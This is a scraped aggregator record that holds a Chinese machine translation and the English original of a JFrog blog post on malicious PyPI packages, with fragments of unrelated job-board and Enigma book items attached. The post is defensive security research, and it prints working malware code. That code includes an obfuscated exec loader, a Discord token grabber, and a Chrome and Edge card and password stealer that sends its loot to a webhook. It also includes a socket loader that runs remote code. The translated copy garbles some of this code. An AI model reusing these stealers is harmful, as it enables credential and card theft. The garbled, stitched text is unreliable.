\u673a\u5668\u53d1\u8d77\u6210\u529f\u7684\u653b\u51fb\u3002\u4f5c\u4e3a JFrog \u5b89\u5168\u7814\u7a76\u56e2\u961f\uff08\u524d\u8eab\u4e3a Vdoo\uff09\u81ea\u52a8\u8bc6\u522b\u6076\u610f\u5305\u7684\u6301\u7eed\u52aa\u529b\u7684\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u73b0\u5728\u62a5\u544a\u6258\u7ba1\u5728 PyPI \u4e0a\u7684\u51e0\u4e2a Python \u5305\u662f\u6076\u610f\u7684\u3002\u6211\u4eec\u5df2\u901a\u77e5 PyPI \u6709\u5173\u6076\u610f\u8f6f\u4ef6\u5305\u7684\u5b58\u5728\uff0c\u5e76\u7acb\u5373\u5c06\u5176\u5220\u9664\u3002\u6839\u636e pepy.tech \u7684\u6570\u636e\uff0c\u6211\u4eec\u4f30\u8ba1\u6076\u610f\u8f6f\u4ef6\u5305\u7684\u4e0b\u8f7d\u6b21\u6570\u7ea6\u4e3a 30,000 \u6b21\u3002\u6211\u4eec\u76ee\u524d\u6ca1\u6709\u5173\u4e8e\u4f7f\u7528\u8fd9\u4e9b\u6076\u610f\u8f6f\u4ef6\u5305\u9020\u6210\u7684\u5b9e\u9645\u5f71\u54cd\u7684\u6570\u636e\u3002\u5728\u8fd9\u7bc7\u535a\u6587\u4e2d\uff0c\u6211\u4eec\u5c06\u5206\u4eab\u8fd9\u4e9b\u8f6f\u4ef6\u5305\u7684\u6280\u672f\u5206\u6790\u53ca\u5176\u5f71\u54cd\u3002\u4e0a\u8ff0\u6240\u6709\u8f6f\u4ef6\u5305\uff08\u4ee5\u53ca\u5927\u591a\u6570 Python \u65b0\u624b\u6076\u610f\u8f6f\u4ef6\uff09\u90fd\u4f7f\u7528\u4e86\u4e00\u79cd\u7b80\u5355\u7684\u6df7\u6dc6\u6280\u672f\uff1aimport base64, codecs magic = &#39;aW1wb3J0IGNvbG9yYW1hLCBkYXRldGltZS...&#39; love = &#39;0iL\u200b\u200bKOcY3L4Y2q1nJkxpl97nZYogdm&#39;... yxIKAVDaAQK3xjpQWkqRAboUcBIzqjEmS...&#39;joy = &#39;\\x72\\x6f\\x74\\x31\\x33&#39; trust = eval(&#39;\\x6d\\x61\\x67\\x69\\x63&#39;) + eval(&#39;\\x63\\x6x5\\x63&#39; \\x73\\x2e\\x64...&#39;) eval(compile(base64.b64decode(eval(&#39;\\x74\\x72\\x75\\x73\\x74&#39;)),&#39;&#39;,&#39;exec&#39;)) \u8fd9\u79cd\u6df7\u6dc6\u53ef\u4ee5\u6b3a\u9a97\u4e00\u4e2a\u7b80\u5355\u7684\u9759\u6001\u5206\u6790\u5de5\u5177\uff0c\u4f46\u5e76\u4e0d\u53cd\u5bf9\u66f4\u5f7b\u5e95\u7684\u5206\u6790\uff0c\u5b9e\u9645\u4e0a\u63d0\u51fa\u4e86\u4e00\u4e2a\u5371\u9669\u4fe1\u53f7\uff0c\u8ba9\u8bb8\u591a\u7814\u7a76\u4eba\u5458\u4ed4\u7ec6\u7814\u7a76\u8fd9\u6bb5\u4ee3\u7801\u3002\u6df7\u6dc6\u4ee3\u7801\u4e2d\u4f7f\u7528\u7684\u7279\u5b9a\uff08\u53d7\u5317\u6b27\u91d1\u5c5e\u542f\u53d1\uff1f\uff09\u5b57\u7b26\u4e32\u5e2e\u52a9\u6211\u4eec\u610f\u8bc6\u5230\u6076\u610f\u8f6f\u4ef6\u53ea\u662f\u4f7f\u7528\u516c\u5171\u5de5\u5177 python-obfuscator \u8fdb\u884c\u4e86\u5904\u7406\u3002\n\u4f7f\u7528 PyArmor \u5bf9 aryi \u548c permit \u5305\u8fdb\u884c\u4e86\u6df7\u6dc6\uff0c\u8fd9\u8868\u660e\u6076\u610f\u8f6f\u4ef6\u5f00\u53d1\u4eba\u5458\u6b63\u5728\u5c1d\u8bd5\u4e0d\u540c\u7684\u6df7\u6dc6\u65b9\u6cd5\u3002\u8d35\u65cf\u201c\u5bb6\u65cf\u201d\u6076\u610f\u8f6f\u4ef6\u7684\u7b2c\u4e00\u4e2a\u6709\u6548\u8f7d\u8377\u662f\u7a83\u53d6 Discord \u8eab\u4efd\u9a8c\u8bc1\u4ee4\u724c\u3002\u8eab\u4efd\u9a8c\u8bc1\u4ee4\u724c\u5141\u8bb8\u653b\u51fb\u8005\u5192\u5145\u6700\u521d\u6301\u6709\u4ee4\u724c\u7684\u7528\u6237\uff08\u7c7b\u4f3c\u4e8e HTTP \u4f1a\u8bdd cookie\uff09\u3002\u7a83\u53d6\u4ee4\u724c\u7684\u6709\u6548\u8f7d\u8377\u57fa\u4e8e\u81ed\u540d\u662d\u8457\u7684 dTGPG\uff08Discord Token Grabber Payload Generator\uff09\u6709\u6548\u8f7d\u8377\u3002\u8fd9\u662f\u4e00\u4e2a\u4ece\u672a\u516c\u5f00\u53d1\u5e03\u7684\u751f\u6210\u5668\u5de5\u5177\uff0c\u4f46\u6709\u6548\u8f7d\u8377\uff08\u4e2a\u6027\u5316\u4ee4\u724c\u6293\u53d6\u5668\uff09\u662f\u516c\u5f00\u5171\u4eab\u7684\uff0c\u5e76\u4e14\u4e00\u4e9b\u793a\u4f8b\u4e5f\u4e0a\u4f20\u5230\u4e86 Github\u3002 Discord \u8eab\u4efd\u9a8c\u8bc1\u4ee4\u724c\u7a83\u53d6\u5668\u4ee3\u7801\u975e\u5e38\u7b80\u5355\uff0c\u5b83\u8fed\u4ee3\u4e00\u7ec4\u786c\u7f16\u7801\u7684\u8def\u5f84\uff1a local = os.getenv(&#39;LOCALAPPDATA&#39;) roaming = os.getenv(&#39;APPDATA&#39;) paths = { &#39;Discord&#39;: roaming + &#39;\\\\ Discord&#39;, &#39;Discord Canary&#39;: \u6f2b\u6e38 + &#39;\\\\discordcanary&#39;, &#39;Discord PTB&#39;: \u6f2b\u6e38 + &#39;\\\\discordptb&#39;, &#39;Google Chrome&#39;: \u672c\u5730 + &#39;\\\\Google\\\\Chrome\\\\User Data\\\\Default &#39;, &#39;Opera&#39;: \u6f2b\u6e38 + &#39;\\\\Opera Software\\\\Opera Stable&#39;, &#39;Brave&#39;: \u672c\u5730 + &#39;\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default&#39;, &#39;Yandex&#39;: \u672c\u5730 + &#39; \\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default&#39; } \u7136\u540e\u7b80\u5355\u5730\u8bfb\u53d6\u8fd9\u4e9b\u8def\u5f84\u4e0b\u7684\u6240\u6709 .log \u548c .ldb \u6587\u4ef6\uff08\u7279\u522b\u662f\u5728 Local Sotrage\\leveldb \u4e0b\uff09\u5e76\u67e5\u627e Discord \u8eab\u4efd\u9a8c\u8bc1\u4ee4\u724c\uff0c\u5982\u4e0b\u6240\u793a\uff1aAhDDanSZFkkf2j2J8co2d5Tn .G2rsTL.ZP2E7xR3AiapA8oNmgyqsao0Fj1\uff08\u5355\u56e0\u7d20\u4ee4\u724c \u2013 24 \u4e2a\u5b57\u7b26 + &#39;.&#39; + 6 \u4e2a\u5b57\u7b26 + &#39;.&#39; + 27 \u4e2a\u5b57\u7b26\uff09\n\u7ed3\u679c\u901a\u8fc7 Webhook\uff08\u4e00\u79cd\u5c06\u81ea\u52a8\u6d88\u606f\u548c\u6570\u636e\u66f4\u65b0\u53d1\u9001\u5230\u79c1\u4eba\u670d\u52a1\u5668\u4e0a\u7684\u6587\u672c\u901a\u9053\u7684\u7b80\u5355\u65b9\u6cd5\uff09\u4e0a\u4f20\u5230 Discord\uff0c\u53c2\u6570\u5982\u4e0b\uff1a{ &quot;type&quot;: 1, &quot;id&quot;: &quot;807327703082074143&quot;, &quot;name&quot;: &quot;Captain Hook&quot;, &quot;avatar&quot;: null, &quot;channel_id&quot;: &quot;725001140324008047&quot;, &quot;guild_id&quot;: &quot;720931953251057725&quot;, &quot;application_id&quot;: null, &quot;token&quot;: &quot;uwAgm3PQUNDQvCdvChpx7vCvCvFxpgsvCvCvCvCypgsvCypgsvCypz8047&quot;\u8d35\u65cf\u5bb6\u65cf\u7684\u7b2c\u4e8c\u4e2a\u6709\u6548\u8f7d\u8377\u662f\u201c\u81ea\u52a8\u5b8c\u6210\u201d\u4fe1\u606f\u7a83\u53d6\u5668\u3002\u6240\u6709\u73b0\u4ee3\u6d4f\u89c8\u5668\u90fd\u652f\u6301\u4e3a\u7528\u6237\u4fdd\u5b58\u5bc6\u7801\u548c\u4fe1\u7528\u5361\u4fe1\u606f\uff1a\u8fd9\u5f88\u65b9\u4fbf\uff0c\u4f46\u7f3a\u70b9\u662f\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4f1a\u88ab\u8bbf\u95ee\u200b\u200b\u672c\u5730\u673a\u5668\u7684\u6076\u610f\u8f6f\u4ef6\u6cc4\u9732\u3002 def cs(): master_key = master() login_db = os.environ[&#39;USERPROFILE&#39;] + os.sep + \\r&#39;AppData\\Local\\Google\\Chrome\\User Data\\default\\Web Data&#39;shutil.copy2(login_db, &quot;CCvault.db&quot;) conn = sqlite3.connect(&quot;CCvault.db&quot;) cursor = conn.cursor() try: cursor.execute(&quot;SELECT * FROM credit_cards&quot;) for r in cursor.fetchall(): username = r [1]encrypted_pa\u200b\u200bssword=r[4]decrypted_pa\u200b\u200bssword=dpw(encrypted_pa\u200b\u200bssword,master_key)expire_mon=r[2]expire_year=r[3]hook.send(f&quot;CARD-NAME:&quot;+\u7528\u6237\u540d+&quot;\\nNUMBER:&quot;+decrypted_pa\u200b\u200bssword + &quot;\\nEXPIRY M: &quot; + str(expire_mon) + &quot;\\nEXPIRY Y: &quot; + str(expire_year) + &quot;\\n&quot; + &quot;*&quot; * 10 + &quot;\\n&quot;) login_db = os.environ[&#39;USERPROFILE&#39; ] + os.sep + r&#39;\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data&#39; ... cursor.execute(&quot;SELECT action_url, username_value, password_value FROM logins&quot;)decrypted_pa\u200b\u200bssword = dpw(encrypted_pa\u200b\u200bssword, master_key) \u5982\u679c\u7528\u6237\u540d != &quot;&quot; \u6216 encrypted_pa\u200b\u200bssword != &quot;&quot;: hook.send(f&quot;URL: &quot; + url + &quot;\\nUSER: &quot; + username + &quot;\\nPASSWORD: &quot; + encrypted_p assword + &quot;\\n&quot; + &quot;*&quot; * 10 + &quot;\\n&quot;) \u8d35\u65cf\u5bb6\u65cf\u7684\u7b2c\u4e09\u4e2apayload\u6536\u96c6\u53d7\u5bb3\u8005\u7cfb\u7edf\u7684\u4ee5\u4e0b\u4fe1\u606f\uff0c\u5e76\u5c06\u5176\u4e0a\u4f20\u5230\u63d0\u5230\u7684Webhook\uff1a\n\u5728\u201c\u4f7f pytagora \u5b9a\u7406\u53d8\u5f97\u5bb9\u6613\u201d\uff08\u539f\u6587\u5982\u6b64\uff09\u7684\u6709\u8da3\u4f2a\u88c5\u4e0b\uff0c\u8fd9\u662f\u5305\u7684\u5168\u90e8\u4ee3\u7801\uff1a import math import base64,sys def hello(): exec(base64.b64decode(&#39;aW1wb3J0IHNvY2tldCxzdHJ1Y3Qs...&#39;)) def hypotenuse (a,b): hello() c = math.sqrt(math.pow(a,2) + math.pow(b,2)) return round(c,2) def other(c,x): y = math.sqrt(math.pow(c,2)-math.pow(x,2)) return round(y,2) import socket,struct,time s=socket.socket(2,socket.socket.socket.SOCK_STREAM ) s.connect((&#39;172.16.60.80&#39;,9009)) l=struct.unpack(&#39;&gt;I&#39;,s.recv(4))[0] \u6253\u5370 (l) d=s.recv(l) \u6253\u5370 ( d) while len(d)&gt;!1: d+=s.recv(l-len(d)) print (d) exec(d,{&#39;s&#39;:s}) \u7b80\u800c\u8a00\u4e4b\u2014\u2014\u6076\u610f\u8f6f\u4ef6\u8bd5\u56fe\u8fde\u63a5\u5230TCP \u7aef\u53e3 9009 \u4e0a\u7684\u79c1\u6709 IP \u5730\u5740\uff0c\u7136\u540e\u6267\u884c\u4ece\u5957\u63a5\u5b57\u8bfb\u53d6\u7684\u4efb\u4f55 Python \u4ee3\u7801\u3002\u5982\u679c\u5728\u68c0\u67e5\u60a8\u7684 PyPI \u4f9d\u8d56\u9879\u540e\uff0c\u60a8\u786e\u5b9a\u5df2\u7ecf\u5728\u672c\u5730\u5b89\u88c5\u4e86 noblesse\uff08\u6216\u5176\u4efb\u4f55\u514b\u9686\uff09\uff0c\u6211\u4eec\u5efa\u8bae\uff1a \u68c0\u67e5 Edge \u4e2d\u4fdd\u5b58\u4e86\u54ea\u4e9b\u5bc6\u7801\uff0c\u5e76\u5728\u6bcf\u4e2a\u76f8\u5e94\u7684\u7f51\u7ad9\uff08\u52a0\u4e0a\u4efb\u4f55\u91cd\u590d\u4f7f\u7528\u8fd9\u4e9b\u5bc6\u7801\u7684\u7f51\u7ad9\uff09\u3002\u53ef\u4ee5\u901a\u8fc7\u6253\u5f00 Edge \u5e76\u5bfc\u822a\u5230 edge://settings/passwords \u6765\u6267\u884c\u68c0\u67e5\u3002\u4fdd\u5b58\u7684\u5bc6\u7801\uff08\u53ef\u80fd\u5df2\u88ab\u6cc4\u9732\uff09\u7684\u5b8c\u6574\u5217\u8868\u53ef\u4ee5\u5728\u201c\u4fdd\u5b58\u7684\u5bc6\u7801\u201d\u4e0b\u67e5\u770b\u3002\u68c0\u67e5 Chrome \u4e2d\u4fdd\u5b58\u4e86\u54ea\u4e9b\u4fe1\u7528\u5361\u5e76\u8003\u8651\u53d6\u6d88\u8fd9\u4e9b\u4fe1\u7528\u5361\u3002\u53ef\u4ee5\u901a\u8fc7\u6253\u5f00 Chrome \u5e76\u5bfc\u822a\u5230 chrome://settings/payments \u6765\u6267\u884c\u68c0\u67e5\u3002\u5df2\u4fdd\u5b58\u7684\u4fe1\u7528\u5361\uff08\u53ef\u80fd\u5df2\u88ab\u76d7\u7528\uff09\u7684\u5b8c\u6574\u5217\u8868\u53ef\u5728\u4ed8\u6b3e\u65b9\u5f0f\u4e0b\u67e5\u770b\u3002\n\u5982\u679c\u60a8\u786e\u5b9a pytagora\uff08\u6216\u5176\u4efb\u4f55\u514b\u9686\uff09\u5df2\u672c\u5730\u5b89\u88c5\u5728\u60a8\u7684\u673a\u5668\u4e0a\uff0c\u800c\u60a8\u4e0d\u592a\u53ef\u80fd\u611f\u67d3\u6076\u610f\u8f6f\u4ef6\uff0c\u6211\u4eec\u5efa\u8bae\u60a8\u9075\u5faa\u901a\u5e38\u7684\u6076\u610f\u8f6f\u4ef6\u68c0\u67e5\u6b65\u9aa4\uff0c\u4f8b\u5982\u4f7f\u7528\u5df2\u5b89\u88c5\u7684 Anti \u8fd0\u884c\u5b8c\u6574\u626b\u63cf- \u75c5\u6bd2\u8f6f\u4ef6\u3002\u6b63\u5982\u6211\u4eec\u5728\u4e4b\u524d\u7684 PyPI \u7814\u7a76\u4e2d\u4e5f\u770b\u5230\u7684\uff0c\u516c\u5171\u8f6f\u4ef6\u5b58\u50a8\u5e93\u4e2d\u7f3a\u4e4f\u8282\u5236\u548c\u81ea\u52a8\u5316\u5b89\u5168\u63a7\u5236\uff0c\u5373\u4f7f\u662f\u6ca1\u6709\u7ecf\u9a8c\u7684\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u5c06\u5b83\u4eec\u7528\u4f5c\u4f20\u64ad\u6076\u610f\u8f6f\u4ef6\u7684\u5e73\u53f0\uff0c\u65e0\u8bba\u662f\u901a\u8fc7\u57df\u540d\u62a2\u6ce8\u3001\u4f9d\u8d56\u6df7\u6dc6\u8fd8\u662f\u7b80\u5355\u7684\u793e\u4f1a\u5de5\u7a0b\u653b\u51fb\u3002\u672c\u7814\u7a76\u4e2d\u5206\u6790\u7684\u51e0\u4e4e\u6240\u6709\u4ee3\u7801\u7247\u6bb5\u90fd\u57fa\u4e8e\u5df2\u77e5\u7684\u516c\u5171\u5de5\u5177\uff0c\u4ec5\u66f4\u6539\u4e86\u5c11\u6570\u53c2\u6570\u3002\u6df7\u6dc6\u4e5f\u662f\u57fa\u4e8e\u516c\u5171\u6df7\u6dc6\u5668\u3002\u6211\u4eec\u5e0c\u671b\u770b\u5230\u66f4\u591a\u8fd9\u4e9b\u201c\u5f17\u5170\u80af\u65af\u5766\u201d\u6076\u610f\u8f6f\u4ef6\u5305\u4ece\u4e0d\u540c\u7684\u653b\u51fb\u5de5\u5177\u62fc\u63a5\u800c\u6210\uff08\u5177\u6709\u66f4\u6539\u7684\u6e17\u6f0f\u53c2\u6570\uff09\u3002\u6211\u4eec\u5c06\u7ee7\u7eed\u76d1\u63a7\u516c\u5171\u8f6f\u4ef6\u5305\u5b58\u50a8\u5e93\u4ee5\u6e05\u7406\u6b64\u7c7b\u5b9e\u4f8b\u3002\u6700\u540e\uff0c\u6211\u4eec\u8981\u611f\u8c22 Dustin Ingram (@di_codes) \u5feb\u901f\u54cd\u5e94\u5e76\u5220\u9664\u6076\u610f\u8f6f\u4ef6\u5305\u3002", "note_en": "Software package repositories are becoming a popular target for supply chain attacks. Recently, there has been news about malware attacks on popular repositories like npm, PyPI, and RubyGems. Developers are blindly trusting repositories and installing packages from these sources, assuming they are secure. Sometimes malware packages are allowed to be uploaded to the package repository, giving malicious actors the opportunity to use repositories to distribute viruses and launch successful attacks on both developer and CI/CD machines in the pipeline.\n As part of an ongoing effort by the JFrog security research team (formerly Vdoo) to automatically identify malicious packages, we are now reporting several Python packages hosted on PyPI as malicious. We have alerted PyPI about the existence of the malicious packages which promptly removed them. Based on data from  pepy.tech, we estimate the malicious packages were downloaded about 30,000 times. We currently don\u2019t have data about the actual impact caused by the use of these malicious packages.\n In this blog post, we will share the technical analysis of these packages and their impact.\n     All of the above packages (and most novice Python malware) use a simple obfuscation technique of:\n   import base64, codecs\rmagic = &#39;aW1wb3J0IGNvbG9yYW1hLCBkYXRldGltZS...&#39;\rlove = &#39;0iLKOcY3L4Y2q1nJkxpl97nJE9Y2EyoTI0M...&#39;\rgod = &#39;a2luZy5hcHBlbmQodG9rZW4pDQogICAgICAg...&#39;\rdestiny = &#39;yxIKAVDaAQK3xjpQWkqRAboUcBIzqjEmS...&#39;\rjoy = &#39;\\x72\\x6f\\x74\\x31\\x33&#39;\rtrust = eval(&#39;\\x6d\\x61\\x67\\x69\\x63&#39;) + eval(&#39;\\x63\\x6f\\x64\\x65\\x63\\x73\\x2e\\x64...&#39;)\reval(compile(base64.b64decode(eval(&#39;\\x74\\x72\\x75\\x73\\x74&#39;)),&#39;&#39;,&#39;exec&#39;))\n  This obfuscation can trick a simple static analysis tool, but doesn\u2019t stand against a more thorough analysis, and actually raises a red flag that will make many researchers take a closer look at this code.\n The specific (Nordic metal inspired?) strings used in the obfuscated code helped us to realize that the malware was simply processed with the public tool  python-obfuscator.\n The packages aryi and suffer were obfuscated using  PyArmor, suggesting that malware developers are experimenting with different obfuscation methods.\n  The first payload of the  noblesse \u201cfamily\u201d of malwares is stealing Discord authentication tokens. An authentication token allows the attacker to impersonate the user that originally held the token (similar to HTTP session cookies).\n The payload stealing the tokens is based on the infamous  dTGPG (Discord Token Grabber Payload Generator) payload. This is a generator tool that was never released publicly, but the payloads (the individualized token grabbers) are shared publicly, and some examples were also uploaded to  Github.\n The Discord auth token stealer code is extremely simple, it iterates a hardcoded set of paths:\n local = os.getenv(&#39;LOCALAPPDATA&#39;)\rroaming = os.getenv(&#39;APPDATA&#39;)\r\rpaths = {\r &#39;Discord&#39;: roaming + &#39;\\\\Discord&#39;,\r &#39;Discord Canary&#39;: roaming + &#39;\\\\discordcanary&#39;,\r &#39;Discord PTB&#39;: roaming + &#39;\\\\discordptb&#39;,\r &#39;Google Chrome&#39;: local + &#39;\\\\Google\\\\Chrome\\\\User Data\\\\Default&#39;,\r &#39;Opera&#39;: roaming + &#39;\\\\Opera Software\\\\Opera Stable&#39;,\r &#39;Brave&#39;: local + &#39;\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default&#39;,\r &#39;Yandex&#39;: local + &#39;\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default&#39;\r}\n and then simply reads all  .log and  .ldb files under these paths (specifically under Local  Sotrage\\leveldb) and looks for Discord authentication tokens, which looks like this:\n AhDDanSZFkkf2j2J8co2d5Tn.G2rsTL.ZP2E7xR3AiapA8oNmgyqsao0Fj1 (Single-factor token \u2013 24 chars + \u2018.\u2019 + 6 chars + \u2018.\u2019 + 27 chars)\n The results are uploaded to Discord via a Webhook (an easy way to get automated messages and data updates sent to a text channel on a private server) with the  following parameters:\n {\r &#34;type&#34;: 1,\r &#34;id&#34;: &#34;807327703082074143&#34;,\r &#34;name&#34;: &#34;Captain Hook&#34;,\r &#34;avatar&#34;: null,\r &#34;channel_id&#34;: &#34;725001140324008047&#34;,\r &#34;guild_id&#34;: &#34;720931953251057725&#34;,\r &#34;application_id&#34;: null,\r &#34;token&#34;: &#34;uwAgm7PQaROJB3USUNDv1RT7uJzfidUsHBsC_y0p2qtChlzNVgpG1vw2zAtkFX-8Xq-x&#34;\r}\n  The second payload of the  noblesse family is an \u201cAutocomplete\u201d information stealer. All modern browsers support saving passwords and credit card information for the user:\n  This is very convenient, but the downside is that this information can be leaked by malicious software that got access to the local machine.\n  def cs():\r master_key = master()\r login_db = os.environ[&#39;USERPROFILE&#39;] + os.sep + \\\r r&#39;AppData\\Local\\Google\\Chrome\\User Data\\default\\Web Data&#39;\r shutil.copy2(login_db,\r &#34;CCvault.db&#34;)\r conn = sqlite3.connect(&#34;CCvault.db&#34;)\r cursor = conn.cursor()\r\r try:\r cursor.execute(&#34;SELECT * FROM credit_cards&#34;)\r for r in cursor.fetchall():\r username = r[1]\r encrypted_password = r[4]\r decrypted_password = dpw(\r encrypted_password, master_key)\r expire_mon = r[2]\r expire_year = r[3]\r hook.send(f&#34;CARD-NAME: &#34; + username + &#34;\\nNUMBER: &#34; + decrypted_password + &#34;\\nEXPIRY M: &#34; + str(expire_mon) + &#34;\\nEXPIRY Y: &#34; + str(expire_year) + &#34;\\n&#34; + &#34;*&#34; * 10 + &#34;\\n&#34;)\n  login_db = os.environ[&#39;USERPROFILE&#39;] + os.sep + r&#39;\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data&#39;\r...\rcursor.execute(&#34;SELECT action_url, username_value, password_value FROM logins&#34;)\rdecrypted_password = dpw(encrypted_password, master_key)\rif username != &#34;&#34; or decrypted_password != &#34;&#34;:\r\thook.send(f&#34;URL: &#34; + url + &#34;\\nUSER: &#34; + username + &#34;\\nPASSWORD: &#34; + decrypted_password + &#34;\\n&#34; + &#34;*&#34; * 10 + &#34;\\n&#34;)\n   The third payload of the  noblesse family gathers the following information about the victim\u2019s system, and uploads it to the mentioned Webhook:\n    Under the interesting pretense of \u201cMake pytagora theorem easy\u201d (sic) this is the entirety of the package\u2019s code:\n import math\rimport base64,sys\rdef hello():\r\texec(base64.b64decode(&#39;aW1wb3J0IHNvY2tldCxzdHJ1Y3Qs...&#39;))\rdef hypotenuse(a,b):\r\thello()\r\tc = math.sqrt(math.pow(a,2) + math.pow(b,2))\r\treturn round(c,2)\rdef other(c,x):\r\ty = math.sqrt(math.pow(c,2)-math.pow(x,2))\r\treturn round(y,2)\n  import socket,struct,time\rs=socket.socket(2,socket.socket.socket.SOCK_STREAM)\rs.connect((&#39;172.16.60.80&#39;,9009))\rl=struct.unpack(&#39;&gt;I&#39;,s.recv(4))[0]\rprint (l)\rd=s.recv(l)\rprint (d)\rwhile len(d)&gt;!1:\rd+=s.recv(l-len(d))\rprint (d)\rexec(d,{&#39;s&#39;:s})\n To be succinct \u2013 the malware tries to connect to a private IP address on TCP port 9009, and then execute whatever Python code is read from the socket.\n   \u200bIf, after checking your PyPI dependencies, you have identified that  noblesse (or any of its clones) has been locally installed, we suggest:\n \u200bChecking which passwords were saved in  Edge, and changing these compromised passwords in each respective website (plus any websites where these passwords were reused).The check can be performed by opening  Edge and navigating to  edge://settings/passwords. The full list of saved passwords (which were potentially compromised) can be seen under  Saved passwords.\n Checking which credit cards were saved in  Chrome and consider canceling these credit cards.The check can be performed by opening  Chrome and navigating to chrome://settings/payments. The full list of saved credit cards (which were potentially compromised) can be seen under  Payment methods.\n \u200bIf you have identified that  pytagora (or any of its clones) has been locally installed on your machine, while unlikely that you were infected with malware, we suggest following the usual malware checking steps, such as running a full scan with your installed Anti-Virus software.\n  As we have also seen in our  previous PyPI research, lack of moderation and automated security controls in public software repositories allow even inexperienced attackers to use them as a platform to spread malware, whether through typosquatting, dependency confusion, or simple social engineering attacks.\n Almost all of the code snippets analyzed in this research were based on known public tools, with only a few parameters changed. The obfuscation was also based on public obfuscators.\n We expect to see more of these \u201cFrankenstein\u201d malware packages stitched from different attack tools (with changed exfiltration parameters). We will continue to monitor public package repositories to sanitize such instances.\n Finally, we\u2019d like to thank Dustin Ingram ( @di_codes), for quickly responding and removing the malicious packages.", "posttime": "2021-08-05 20:55:10", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u4ee3\u7801,pypi,quot", "title": "\u6076\u610f PyPI \u5305\u7a83\u53d6\u4fe1\u7528\u5361\u5e76\u6ce8\u5165\u4ee3\u7801", "title_en": "Malicious PyPI packages stealing credit cards and injecting code", "transed": 1, "url": "https://jfrog.com/blog/malicious-pypi-packages-stealing-credit-cards-injecting-code/", "via": "", "real_tags": ["\u4ee3\u7801", "pypi", "quot"]}, {"category": "", "categoryclass": "", "imagename": "5b3cbebc5694beb2bc8b683b018b4a1c.png", "infoid": 1071338, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5bfb\u627e\u5177\u6709\u66f4\u597d\u5de5\u4f5c\u4e0e\u751f\u6d3b\u5e73\u8861\u7684\u8fdc\u7a0b\u7f16\u7a0b\u5de5\u4f5c\u7684\u5730\u65b9\u3002\u6211\u4eec\u53ea\u5217\u51fa\u6bcf\u5468 4 \u5929\u5de5\u4f5c\u5236\u3001\u517c\u804c\u548c\u5de5\u4f5c\u65f6\u95f4\u7075\u6d3b\u7684\u5de5\u4f5c\u3002", "note_en": "The place to find remote programming jobs with a better work-life balance. We only list 4 day work week, part time and jobs with flexible hours.", "posttime": "2021-08-05 20:54:54", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u79d1\u6280,companies", "title": "\u6bcf\u5468\u5de5\u4f5c\u56db\u5929\u7684\u79d1\u6280\u516c\u53f8", "title_en": "Tech Companies with Four-Day Work Weeks", "transed": 1, "url": "https://4dayweek.io/blog/10-tech-companies-with-4-day-work-weeks-2021", "via": "", "real_tags": ["\u79d1\u6280", "companies"]}, {"category": "", "categoryclass": "", "imagename": "dcd58deb7f8a20e2b126329f43c58999.jpg", "infoid": 1071337, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "X\u3001Y \u548c Z\uff1aEnigma \u5982\u4f55\u7834\u89e3\u7684\u771f\u5b9e\u6545\u4e8b Dermot Turing The History Press (2018) Alan Turing \u5728\u7b2c\u4e8c\u6b21\u4e16\u754c\u5927\u6218\u4e2d\u5bf9\u5fb7\u56fd\u4fe1\u606f\u7684\u5173\u952e\u89e3\u8bfb\u662f\u5bc6\u7801\u7834\u8bd1\u7684\u7edd\u6d3b\u3002\u4ece 1940 \u5e74\u8d77\uff0c\u56fe\u7075\u548c\u4ed6\u7684\u56e2\u961f\u8bbe\u8ba1\u4e86\u6570\u767e\u53f0\u7535\u5b50\u673a\u5668\uff0c\u79f0\u4e3a\u70b8\u5f39\uff0c\u53ef\u4ee5\u89e3\u5bc6\u654c\u65b9\u6307\u6325\u5b98\u6bcf\u5929\u53d1\u9001\u7684\u6570\u5343\u5c01\u4fe1\u4ef6\uff0c\u4ee5\u6307\u5bfc\u4ed6\u4eec\u7684\u58eb\u5175\u3002\u8fd9\u79cd\u77e5\u8bc6\u7684\u6d2a\u6d41\u7f29\u77ed\u4e86\u6218\u4e89\u3002\u82f1\u56fd\u5e03\u83b1\u5207\u5229\u516c\u56ed\u2014\u2014\u8fd9\u4e00\u5207\u53d1\u751f\u7684\u79d8\u5bc6\u4e2d\u5fc3\u2014\u2014\u7406\u6240\u5f53\u7136\u5730\u5728\u5386\u53f2\u4e0a\u5360\u6709\u4e00\u5e2d\u4e4b\u5730\u3002\u4f46\u4e0e\u6240\u6709\u7a81\u7834\u4e00\u6837\uff0c\u66f4\u591a\u7684\u4eba\u5960\u5b9a\u4e86\u57fa\u7840\u3002\u4f1f\u5927\u6570\u5b66\u5bb6\u7684\u4f84\u5b50\u5fb7\u83ab\u7279\u00b7\u56fe\u7075 (Dermot Turing) \u5728\u4ed6\u7684\u8457\u4f5c X\u3001Y \u548c Z \u4e2d\u8bb2\u8ff0\u4e86\u4e00\u7fa4\u6ce2\u5170\u6570\u5b66\u5bb6\u7684\u6263\u4eba\u5fc3\u5f26\u7684\u6545\u4e8b\uff0c\u4ed6\u4eec\u6bd4\u827e\u4f26\u00b7\u56fe\u7075 (Alan Turing) \u65e9\u4e86\u5f88\u591a\u5e74\uff0c\u4ed6\u4eec\u5bf9\u5fb7\u56fd Enigma \u7f16\u7801\u673a\u5668\u7684\u8fd0\u4f5c\u65b9\u5f0f\u6709\u4e86\u5f88\u591a\u4e86\u89e3\u3002\u5728\u7b2c\u4e8c\u6b21\u4e16\u754c\u5927\u6218\u4e4b\u524d\u548c\u671f\u95f4\uff0c\u6ce2\u5170\u4eba\u4e0e\u6cd5\u56fd\u548c\u82f1\u56fd\u7684\u60c5\u62a5\u90e8\u95e8\u5206\u4eab\u4e86\u4ed6\u4eec\u7684\u79d8\u5bc6\u2014\u2014\u5b57\u6bcd X\u3001Y \u548c Z 